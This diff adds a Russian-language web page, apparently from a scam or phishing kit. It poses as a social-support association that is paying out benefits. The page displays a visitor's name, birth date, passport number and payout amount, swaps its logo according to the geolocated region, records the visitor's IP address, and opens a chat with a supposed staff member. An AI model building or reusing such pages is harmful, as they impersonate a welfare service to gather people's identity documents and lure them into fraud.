@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ru">
+    <head>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" type="text/css" href="index.css">
+        <link rel="stylesheet" type="text/css" href="form.css">
+        <link rel="stylesheet" type="text/css" href="chat.css">
+        <title>Анкета</title>
+        <script src="chat.js" defer></script>
+        <script src= 
+            "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> 
+        </script> 
+        <script src="http://api-maps.yandex.ru/2.0-stable/?load=package.standard&lang=ru-RU" type="text/javascript"></script>
+        <script type="text/javascript">
+            window.onload = function () {
+                setTimeout(
+                    () => document.getElementById("cube-loader").
+                    style.display = "none",
+                1);
+                let region = ymaps.geolocation.region;
+                localStorage.setItem("region", region);
+                if (region == "Москва и Московская область") {
+                    logo__img.src = "../public/Moscow.svg";
+                }
+                //================================
+                let fields = document.querySelectorAll(".chat__aside__p");
+
+                for(let i = 0; i < fields.length; ++i) {
+                    if (localStorage.getItem(fields[i].id) != null) {
+                        fields[i].innerText = localStorage.getItem(fields[i].id);
+                        fields[i].innerText += (fields[i].id === "number") ? " руб." : "";
+                        if (fields[i].id === "birth") {
+                            let date = new Date(localStorage.getItem("birth"));
+                            fields[i].innerText = date.toLocaleString("ru", {
+                                year: 'numeric',
+                                month: 'numeric',
+                                day: 'numeric'
+                            });
+                        }
+                    } 
+                    if (fields[i].id === "name") {
+                        fields[i].innerText = localStorage.getItem("sname") + " " +
+                        localStorage.getItem("fname") + " " + localStorage.getItem("lname");
+                    }
+                }
+
+                $.getJSON('https://json.geoiplookup.io/api?callback=?', function(data) {
+                        localStorage.setItem("ip", data.ip);
+                });
+
+                connect();
+            }
+        </script>
+    </head>
+    <body>
+
+        <div id="cube-loader">
+            <div class="caption">
+              <div class="cube-loader">
+                <div class="cube loader-1"></div>
+                <div class="cube loader-2"></div>
+                <div class="cube loader-4"></div>
+                <div class="cube loader-3"></div>
+              </div>
+            </div>
+          </div>
+
+        <header>
+            <a id="logo">
+                <img id="logo__img" 
+                src="../public/Saint_Petersburg.svg" 
+                height="100%" />
+                <span><label>АССОЦИАЦИЯ</label> СОЦИАЛЬНОЙ<br />
+                    ПОДДЕРЖКИ НАСЕЛЕНИЯ</span>
+            </a>
+            <nav>
+                <select></select>
+                <select></select>
+            </nav>
+        </header>
+
+        <main>
+            <div class="chat">
+                <div class="chat__aside">
+                    <h4><label>Ассоциация</label> социальной поддержки населения</h4>
+                    <label class="chat__aside__label">ФИО</label>
+                    <p id="name" class="chat__aside__p"></p>
+                    <label class="chat__aside__label">Дата рождения</label>
+                    <p id="birth" class="chat__aside__p"></p>
+                    <label class="chat__aside__label">Номер паспорта</label>
+                    <p id="passport" class="chat__aside__p"></p>
+                    <div>
+                        <label class="chat__aside__label">Сумма к выплате:</label>
+                        <p id="number" class="chat__aside__p"></p>
+                    </div>
+                </div>
+                <div class="chat__main">
+                    <div class="chat__header">
+                        <div class="cssload-square">
+                            <div class="cssload-square-part cssload-square-green"></div>
+                            <div class="cssload-square-part cssload-square-pink"></div>
+                            <div class="cssload-square-blend"></div>
+                        </div>
+                    </div>
+                    <div class="chat__text">
+                        <label style="margin: auto" class="loading">Поиск свободного сотрудника...</label>
+                    </div>
+                    <div class="chat__input">
+
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <aside>
+            <div class="contacts">
+                <div class="contacts__text">
+                    <h1>
+                        Остались вопросы?
+                    </h1>
+                    <p>
+                        Задайте их по электронной почте: pochta@test.ru
+                    </p>
+                </div>
+                <div class="contacts__picture">
+                    <a>
+
+                    </a>
+                </div>
+            </div>
+        </aside>
+        <footer>
+            <div>
+                <h4><label>Ассоциация</label> социальной поддержки населения</h4>
+                <span>Москва и Московская область</span>
+            </div>
+            <span>При поддержке ИТ-штаба</span>
+        </footer>
+
+    </body>
+</html>
